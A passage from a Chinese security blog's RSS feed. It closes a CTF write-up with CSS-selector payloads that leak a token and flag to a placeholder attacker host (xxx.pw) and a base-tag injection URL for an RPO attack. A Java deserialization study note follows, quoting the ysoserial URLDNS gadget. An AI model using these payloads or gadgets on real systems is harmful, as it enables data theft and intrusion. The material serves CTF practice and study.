&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">10&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=10&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">a&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">href&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#f92672">flag&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#f92672">token&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#f92672">11&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">//xxx.pw/rpo/?c=11&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>匹配flag时的坑点在于css选择器在匹配的时候首字符不能是数字，而flag的开头为&lt;code>34c3&lt;/code>，所以使用css的模糊匹配&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">#&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">value&lt;/span>&lt;span style="color:#f92672">*=&lt;/span>&lt;span style="color:#f92672">C3_1&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://xxx.pw/?flag=C3_1&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者16进制编码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">#&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#f92672">value&lt;/span>&lt;span style="color:#f92672">^=&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">33&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">34&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">43&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#f92672">33&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">background&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">http://xxx.pw/?34c3&lt;/span>&lt;span style="color:#111">);}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后利用之前的xss点修改base标签进行rpo，获取flag&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.42.134:8080/flag?token=cdebcc090a8b4e339b876c33ad1c0acb%3C/title%3E%3Cbase%20href=urlstorage/123%3E
&lt;/code>&lt;/pre></description></item><item><title>Java学习笔记Ⅲ</title><link>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</link><pubDate>Wed, 23 Mar 2022 18:40:31 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</guid><description>&lt;h2 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h2>
&lt;p>与PHP类似，java的&lt;code>readObject&lt;/code>对标&lt;code>__wakeup&lt;/code>，但不完全一样，&lt;code>readObject&lt;/code>倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的&lt;code>__wakeup&lt;/code>倾向于解决“反序列化后如何初始化这个对象”的问题，它可以在反序列化之后执行初始化操作，该赋的值基本由&lt;code>__construct&lt;/code>控制，真正的入手点一般在&lt;code>__destruct&lt;/code>中&lt;/p>
&lt;p>对java来说，一个可利用的&lt;code>readObject&lt;/code>是链子最初的起点&lt;/p>
&lt;p>在序列化对象时会调用对象的&lt;code>writeObject&lt;/code>方法，参数类型是&lt;code>ObjectOutputStream&lt;/code>，这个类有一个&lt;code>annotateClass&lt;/code>方法，可以通过重写这个方法来向序列化后的数据中写入内容，这个内容位于&lt;code>objectAnnotation&lt;/code>中&lt;/p>
&lt;p>相应的，反序列化时会调用&lt;code>readObject&lt;/code>，可以读出前面写入的内容进行处理&lt;/p>
&lt;p>python的反序列化危害最大，可以直接操控PVM栈上的指令&lt;/p>
&lt;h2 id="urldns">URLDNS&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">URLDNS&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//Avoid DNS resolution during payload creation
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SilentURLStreamHandler&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">ht&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// HashMap that will contain the URL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// URL to use as the Key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URLDNS&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * using the serialized object.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * second resolution.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SilentURLStreamHandler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">URLConnection&lt;/span> &lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">InetAddress&lt;/span> &lt;span style="color:#75af00">getHostAddress&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是yoserial中URLDNS部分的源码，很短&lt;/p>
&lt;p>整个链子的攻击利用的是HashMap会调用key的hashCode方法来定位对应的value，当url object作为key时会由于hashCode的计算进而触发DNS请求（因为要解析hostname是否指向同一个Ip&lt;/p>
&lt;h3 id="hashmap">HashMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">GetField&lt;/span> &lt;span style="color:#111">fields&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read loadFactor (ignore threshold)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">fields&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;loadFactor&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">75f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Float&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isNaN&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal load factor: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">25f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">0f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UnsafeHolder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putLoadFactor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">reinitialize&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read and ignore number of buckets
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read number of mappings (size)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal mappings count: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// use defaults
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">0f&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tableSizeFor&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">fc&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threshold&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">MAX_VALUE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check Map.Entry[].class since it&amp;#39;s the nearest public type to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// what we&amp;#39;re actually creating.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Entry&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
